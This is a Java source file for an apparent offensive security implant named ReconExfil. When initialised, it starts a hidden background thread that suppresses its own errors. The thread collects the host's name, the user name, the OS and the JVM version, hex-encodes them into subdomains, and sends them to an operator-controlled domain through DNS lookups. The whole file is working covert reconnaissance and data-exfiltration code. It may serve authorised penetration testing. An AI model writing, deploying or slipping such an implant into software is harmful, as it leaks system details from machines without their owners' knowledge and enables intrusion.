package org.example.implants;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.zip.CRC32;
import java.util.zip.Checksum;

public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * Top domain to use for data exfiltration.
     * Data will be encoded and included as a subdomain to this top domain.
     * Set this to a Burp Collaborator / Interactsh (or equivalent) hostname that's under your control.
     */
    static volatile String CONF_EXFIL_DNS;

    /**
     * Maximum number of characters for each subdomain.
     * DNS specifies a maximum number of 63 characters.
     * A custom value may be set if there are concerns that upstream DNS servers may dislike a large number of
     * subdomains.
     * Note: This simple implant will just exclude any excess characters from an over-sized field (resulting in data
     * loss).
     */
    static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;

    /**
     * Maximum length of the whole domain name.
     * DNS specifies a maximum total length of a domain name (all subdomains) of 255 characters. However, there need to
     * be space for the length octet and a 0, so the actual max length of a domain name is 253.
     * A custom value may be set if there are concerns that upstream DNS servers may dislike large requests.
     * Note: This simple implant will just exclude any encoded data fields that does not fit.
     */
    static volatile int CONF_DOMAIN_MAX_LEN = 253;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                ReconExfil implant = new ReconExfil();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload(System.getenv(), System.getProperties());
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    private void payload(Map<String, String> envVars, Properties javaProps) {
        if (CONF_EXFIL_DNS == null || CONF_EXFIL_DNS.isEmpty()) {
            return;
        }

        String hostname = getHostname();
        String username = getUsername(envVars, javaProps);
        String osInfo = getOsInfo(javaProps);
        String runtimeInfo = getRuntimeInfo(javaProps);

        /*
         * Fields may be re-arranged in order of priority, but ReconExfilDecoder naively assumes a certain order for
         * its labels. The last field(s) may be automatically excluded if they don't fit into the domain name.
         */
        String fullExfilDnsName = generateEncodedDomainName(hostname, username, osInfo, runtimeInfo);
        resolve(fullExfilDnsName);
    }

    String generateEncodedDomainName(String... fields) {
        String cacheBusterValue = generateCacheBusterValue();
        int lastPartLength = (Long.MAX_VALUE + "." + cacheBusterValue + "." + CONF_EXFIL_DNS).length();
        Checksum checksum = new CRC32();

        StringBuilder domainBuilder = new StringBuilder();
        for (String field : fields) {
            String encodedField = encode(field);
            String addEncodedPart = encodedField + ".";
            if (addEncodedPart.length() + domainBuilder.length() + lastPartLength <= CONF_DOMAIN_MAX_LEN) {
                domainBuilder.append(addEncodedPart);
                checksum.update(field.getBytes(StandardCharsets.UTF_8));
            }
        }

        domainBuilder.append(checksum.getValue()).append(".");
        domainBuilder.append(cacheBusterValue).append(".");
        domainBuilder.append(CONF_EXFIL_DNS);

        return domainBuilder.toString();
    }

    // Just hex represent it for now. This is very space inefficient, but at least it's compatible with DNS.
    static String encode(String input) {
        if (input == null) {
            input = "null";
        }

        StringBuilder hexString = new StringBuilder();
        for (byte b : input.getBytes(StandardCharsets.UTF_8)) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }

        if (hexString.length() > CONF_SUBDOMAIN_MAX_LEN) {
            // Make sure encoded output always consists of full bytes (pairs of two hex digits)
            int cutoffPos = CONF_SUBDOMAIN_MAX_LEN - (CONF_SUBDOMAIN_MAX_LEN % 2);
            return hexString.substring(0, cutoffPos);
        } else {
            return hexString.toString();
        }
    }

    // Use the default system resolver for now
    private static void resolve(String domain) {
        try {
            //noinspection ResultOfMethodCallIgnored
            InetAddress.getByName(domain);
        } catch (UnknownHostException ignored) {
        }
    }

    private static String getHostname() {
        String hostname = "unknown";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException ignored) {
        }

        return hostname;
    }

    static String getUsername(Map<String, String> envVars, Properties javaProps) {
        String username = javaProps.getProperty("user.name");
        if (isUnknown(username)) {
            username = envVars.get("USERNAME");
            if (isUnknown(username)) {
                username = "unknown";
            }
        }

        return username;
    }

    static String getOsInfo(Properties javaProps) {
        String osName = javaProps.getProperty("os.name");
        if (isUnknown(osName)) {
            osName = "unknown";
        }

        String osVer = javaProps.getProperty("os.version");
        if (isUnknown(osVer)) {
            osVer = "unknown";
        }

        return osName + " " + osVer;
    }

    static String getRuntimeInfo(Properties javaProps) {
        String runtimeVer = javaProps.getProperty("java.vm.version");
        if (isUnknown(runtimeVer)) {
            runtimeVer = "unknown";
        }

        return runtimeVer;
    }

    private static boolean isUnknown(String value) {
        return value == null || value.isEmpty();
    }

    static String generateCacheBusterValue() {
        Random rng = new SecureRandom();
        return "" + rng.nextInt(0, Integer.MAX_VALUE);
    }
}